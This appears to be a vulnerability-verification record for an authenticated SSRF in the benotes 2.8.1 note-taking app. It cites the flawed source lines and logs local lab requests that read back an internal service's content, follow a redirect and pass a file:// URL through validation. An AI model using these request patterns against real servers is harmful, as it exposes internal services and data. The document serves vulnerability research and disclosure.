@@ -1,0 +1,51 @@
+BENOTES-01 VERIFICATION EVIDENCE (stage3 local test)
+Target: fr0tt/benotes 2.8.1 (standalone Laravel 8 app, installed from composer.lock)
+Claim: authenticated SSRF via GET /api/meta?url= (curl_exec with FOLLOWLOCATION,
+       no scheme allowlist, no private-IP block)
+Result: VERIFIED
+
+================================================================
+SOURCE FACTS
+================================================================
+app/Http/Controllers/PostController.php:274-281: getUrlInfo() validates only 'url'
+  (Laravel 8.83 validateUrl = Symfony-derived regex; the scheme list at
+  vendor/.../ValidatesAttributes.php:2004 explicitly ALLOWS file, dict, gopher, ftp, ...)
+app/Services/PostService.php:192-208: curl_init with CURLOPT_FOLLOWLOCATION=1,
+  CURLOPT_URL=$url (attacker-controlled), no scheme allowlist, no private/link-local
+  IP block, no redirect re-validation; response parsed for title/description/theme-color
+  and returned to the attacker as JSON (content read-back).
+routes/api.php:42: Route::get('meta', ...) inside auth:api middleware group.
+
+================================================================
+LIVE TESTS (benotes @ http://127.0.0.1:8282, PHP 8.4 built-in server;
+"internal" victim service @ http://127.0.0.1:8484, 127.0.0.1 only)
+================================================================
+
+STEP 0 - auth required:
+  GET /api/meta?url=http://127.0.0.1:8484/ without token -> 401 (auth:api enforced).
+  POST /api/auth/login -> JWT access_token issued for user u1@test.local.
+
+STEP 1 - internal HTTP fetch with content read-back:
+  GET /api/meta?url=http://127.0.0.1:8484/   (Authorization: Bearer <jwt>)
+  -> 200 JSON:
+     {"url":"http://127.0.0.1:8484/","base_url":"http://127.0.0.1",
+      "title":"SECRET-INTERNAL-TITLE-SSRFPROOF","description":"internal-secret-desc-9f2",
+      "color":"#123456","image_path":null}
+  -> server fetched loopback content and returned the internal page's <title> and
+     meta description to the attacker.
+
+STEP 2 - redirect following (CURLOPT_FOLLOWLOCATION):
+  url=http://127.0.0.1:8484/redir.php (302 Location: /secret2/)
+  -> 200 JSON with "title":"SECRET-AFTER-REDIRECT-777",
+     "description":"via-followlocation"
+  -> server followed the 302 and read back the redirect target's content.
+
+STEP 3 - scheme breadth:
+  url=file://localhost/<LAB_ROOT>/proof.txt -> validation PASSES (200; request processed,
+  but no content read-back because the parser only extracts HTML title/meta; libcurl
+  file:// fetch reaches the early "not text/html" return branch).
+
+================================================================
+CONCLUSION
+  Authenticated SSRF with internal content read-back and redirect-following verified.
+  Status: VERIFIED.
